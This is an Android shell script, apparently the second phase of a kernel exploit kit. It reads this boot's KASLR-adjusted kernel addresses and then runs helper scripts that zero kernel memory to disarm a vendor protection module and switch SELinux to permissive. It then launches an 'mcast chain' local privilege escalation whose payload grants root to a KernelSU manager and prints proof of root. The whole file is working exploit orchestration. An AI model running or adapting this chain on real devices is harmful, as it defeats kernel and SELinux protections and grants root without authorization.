#!/system/bin/sh
# Phase 2 -- execute the plan generated for THIS boot.
#
# params.env (generated by tools/vote.py from phase 1) supplies runtime
# addresses; KASLR changes them on every boot, so phase 1 and phase 2 must run
# in the same boot.  If the phone rebooted in between, redo phase 1.
#
# Order matters (this is what the X300/t28 fake chain does before waking its
# child): disarm vr.ko first, then permissive if needed, then the mcast chain
# whose payload hands root to the KSU manager.
D=${KIT_DIR:-/data/local/tmp/ic-kit}
BIN="$D/ic-timer"
FUNCS_ADDR=""
SELINUX_STATE=""
INIT_USER_NS=""
if [ -f "$D/params.env" ]; then
	. "$D/params.env"
else
	echo "[run] no params.env: computing this boot's slide on-device"
	OUT=$("$BIN" slide 2>&1)
	printf '%s\n' "$OUT"
	FUNCS_ADDR=$(printf '%s\n' "$OUT" | sed -n 's/^FUNCS=//p' | tail -n 1)
	SELINUX_STATE=$(printf '%s\n' "$OUT" | sed -n 's/^SELINUX_STATE=//p' | tail -n 1)
	INIT_USER_NS=$(printf '%s\n' "$OUT" | sed -n 's/^INIT_USER_NS=//p' | tail -n 1)
	[ -n "$SELINUX_STATE" ] || {
		echo "[run] slide failed or was refused; stopping before any kernel write"
		exit 4
	}
fi
CTXMAP=${CTXMAP:-u:r:shell:s0}
PKG=${PKG:-}
ATTEMPTS=${ATTEMPTS:-16}
[ -x "$BIN" ] || { echo "[run] missing $BIN"; exit 1; }

DL=""
for d in /sdcard/Download /storage/emulated/0/Download; do
	if [ -d "$d" ] && [ -w "$d" ]; then
		DL=$d
		break
	fi
done
copy_dl() { [ -n "$DL" ] && cp "$1" "$DL/" 2>/dev/null; }

wait_zero() { # name timeout_s
	n=$1
	t=$2
	i=0
	while [ $i -lt "$t" ]; do
		grep -q '\[zero\] target=' "$D/zero-$n.log" 2>/dev/null && return 0
		# "no leak" / "chain broke" is one attempt: the supervisor
		# parks it and forks the next one.  Only give up when it says
		# it is out of attempts or the process is gone.
		grep -q 'no root after' "$D/zero-$n.log" 2>/dev/null && return 1
		kill -0 $! 2>/dev/null || return 1
		sleep 1
		i=$((i + 1))
	done
	return 1
}

if [ -n "${FUNCS_ADDR:-}" ]; then
	echo "[run] [1] zero __tracepoint_sys_exit->funcs <- $FUNCS_ADDR"
	sh "$D/zero.sh" funcs "$FUNCS_ADDR" 0 &
	wait_zero funcs 600 || {
		echo "[run] funcs zero failed; STOP, send zero-funcs.log"
		exit 2
	}
	echo "[run] funcs zero landed (attempt parked)"
	copy_dl "$D/zero-funcs.log"
else
	echo "[run] [1] FUNCS_ADDR empty: vr disarm skipped"
fi

if [ -n "${SELINUX_STATE:-}" ]; then
	echo "[run] [2] zero selinux enforcing <- $SELINUX_STATE (state-7)"
	sh "$D/zero.sh" selinux "$SELINUX_STATE" 1 &
	wait_zero selinux 600 || {
		echo "[run] selinux zero failed; STOP, send zero-selinux.log"
		exit 2
	}
	if [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then
		echo "[run] getenforce=$(getenforce 2>/dev/null); STOP and reboot"
		exit 2
	fi
	if ! cat /sys/fs/selinux/policyvers >/dev/null 2>&1; then
		echo "[run] policyvers unreadable = initialized cleared; REBOOT NOW"
		exit 3
	fi
	echo "[run] selinux Permissive, initialized intact"
	copy_dl "$D/zero-selinux.log"
else
	echo "[run] [2] SELINUX_STATE empty: SELinux left enforcing"
fi

echo "[run] [3] mcast chain, ctxmap=${CTXMAP:-u:r:shell:s0}, userns=${INIT_USER_NS:-fake}"
PAYLOAD_CMD="sh $D/ksu_handoff.sh '${PKG:-}' '' ; grep -E '^(Uid|Gid|CapEff|CapBnd|Seccomp):' /proc/self/status; id; cat /proc/self/attr/current; getenforce; echo LPE-PROOF"
export PAYLOAD_CMD
export IC_DISARM_MODE=0
export IC_REAL_INIT_USER_NS="${INIT_USER_NS:-}"
export IC_SCAN_CTXMAP="${CTXMAP:-u:r:shell:s0}"
export IC_BIN="$BIN"
export ATTEMPTS="${ATTEMPTS:-16}"
sh "$D/run_lpe.sh"
echo "[run] chain returned rc=$?"
echo "[run] success marker: LPE-PROOF + handoff OK + kernelsu in /proc/modules"
echo "[run] do NOT unplug USB / kill -9 parked attempts; reboot to clean"
